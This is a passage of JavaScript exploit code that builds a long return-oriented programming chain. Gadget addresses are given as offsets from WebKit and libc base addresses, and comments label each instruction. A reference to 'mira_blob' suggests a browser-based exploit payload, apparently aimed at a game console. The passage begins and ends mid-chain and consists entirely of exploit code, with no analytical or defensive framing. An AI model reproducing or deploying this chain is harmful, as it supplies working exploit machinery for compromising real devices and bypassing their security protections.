ropchain+1196608, //L2975
//L2973:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1177704, //L2977
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2976:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L2977:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2979:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+763368, //pop rcx
//L2980:
(window.mira_blob||0),
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2982:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1177888, //L2984
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1177904, //L2985
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2984:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1178064, //L2989
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1178112, //L2992
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1178080, //L2990
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1178096, //L2991
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L2988:
db([0, 0]); // 0x0
set_gadget(webkit_base+3236123,); //pop r9
//L2989:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2990:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2991:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2992:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1178224, //L2993+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1178216, //L2993
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L2993:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1178240, //L2993+24
ropchain+1184688, //L2987
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2994:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+763368,); //pop rcx
//L2995:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1178336, //L2998
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2997:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2998:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1178392, //L3000
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3000:
db([0, 0]); // 0x0
//L2999:
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1178456, //L3003
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3002:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+763368,); //pop rcx
//L3003:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1178544, //L3005
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1178560, //L3006
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3005:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3006:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1178720, //L3009
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1178752, //L3011
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1178704, //L3008
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1178736, //L3010
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3008:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3009:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3010:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3011:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1178832, //L3012
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1178848, //L3013
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3012:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3013:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1178944, //L3015
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1178928, //L3014
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3014:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3015:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1179024, //L3016
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3016:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3017:
db([131072, 0]); // 0x20000
set_gadget(libc_base+759608,); //pop rax
//L3018:
db([131072, 0]); // 0x20000
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1179184, //L3020
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1179200, //L3021
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1179168, //L3019
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3019:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3020:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3021:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+6378709, //cmp rax, rcx ; sete al
webkit_base+5168252, //setl al
libc_base+226597, //movzx eax, al
libc_base+764760, //pop rsi
ropchain+1179376, //L3023
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1179392, //L3024
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1179360, //L3022
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3022:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3023:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3024:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1179504, //L3026
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1179552, //L3029
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1179520, //L3027
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3026:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3027:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L3028:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3029:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+21212296, //cmp rax, rsi ; sete al
libc_base+226597, //movzx eax, al
webkit_base+5507491, //shl rax, 3
libc_base+764760, //pop rsi
ropchain+1179664, //L3030+8
libc_base+501454, //add rax, rsi
libc_base+501611, //mov rax, [rax]
libc_base+764760, //pop rsi
ropchain+1179656, //L3030
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+782311 //pop rsp
]);
//L3030:
db([0, 0]); // 0x0
set_gadgets([
ropchain+1179680, //L3030+24
ropchain+1179696, //L3025
libc_base+782311, //pop rsp
ropchain+1179712, //L3031
//L3025:
libc_base+782311, //pop rsp
ropchain+1184672, //L3032
//L3031:
libc_base+764760, //pop rsi
ropchain+1179768, //L3034
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3033:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+763368,); //pop rcx
//L3034:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1179856, //L3036
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1179872, //L3037
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3036:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3037:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1180016, //L3041
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1179984, //L3039
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1180000, //L3040
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3039:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3040:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3041:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1180088, //L3043
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3043:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1180144, //L3044
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3044:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1180240, //L3047
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3046:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+763368,); //pop rcx
//L3047:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1180328, //L3049
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1180344, //L3050
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3049:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3050:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1180504, //L3053
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1180536, //L3055
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1180488, //L3052
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1180520, //L3054
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3052:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3053:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3054:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3055:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1180664, //L3057
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1180680, //L3058
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1180648, //L3056
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3056:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3057:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3058:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1180768, //L3060
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1180824, //L3061
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3061:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1180952, //L3063
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1180984, //L3065
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1180968, //L3064
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3063:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3064:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223440, //mov al, [rdi]
libc_base+764760, //pop rsi
ropchain+1181144, //L3069
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1181096, //L3066
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1181112, //L3067
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3066:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3067:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3068:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L3069:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1181200, //L3070
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L3070:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1181312, //L3072
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1181344, //L3074
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1181328, //L3073
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3072:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3073:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3074:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1181504, //L3078
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1181456, //L3075
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1181472, //L3076
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3075:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3076:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3077:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L3078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1181560, //L3079
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L3079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1181672, //L3081
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1181704, //L3083
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1181688, //L3082
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3081:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3082:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3083:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1181864, //L3087
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1181816, //L3084
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1181832, //L3085
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3084:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3085:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3086:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L3087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1181920, //L3088
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L3088:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1182032, //L3090
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1182064, //L3092
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1182048, //L3091
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3090:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3091:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3092:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1182144, //L3093
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1182160, //L3094
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3093:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3094:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1182320, //L3098
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1182272, //L3095
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1182288, //L3096
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3095:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3096:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3097:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L3098:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1182376, //L3099
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L3099:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1182488, //L3101
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1182520, //L3103
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1182504, //L3102
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3101:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3102:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3103:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1182616, //L3105
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1182600, //L3104
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3104:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3105:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1182712, //L3107
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3106:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L3107:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1182800, //L3109
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1182816, //L3110
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3109:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3110:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1182960, //L3114
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1182928, //L3112
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1182944, //L3113
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L3112:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3113:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3114:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1183032, //L3116
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3116:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1183088, //L3117
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L3117:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1183184, //L3120
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L3119:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+763368,); //pop rcx
//L3120:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1183272, //L3122
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1183288, //L3123
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L3122:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3123:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1183448, //L3126
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1183480, //L3128
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1183432, //L3125
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1183464, //L3127
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L3125:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L3126:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L3127:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L3128:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1183608, //L3130
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1183624, //L3131
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1183592, //L3129
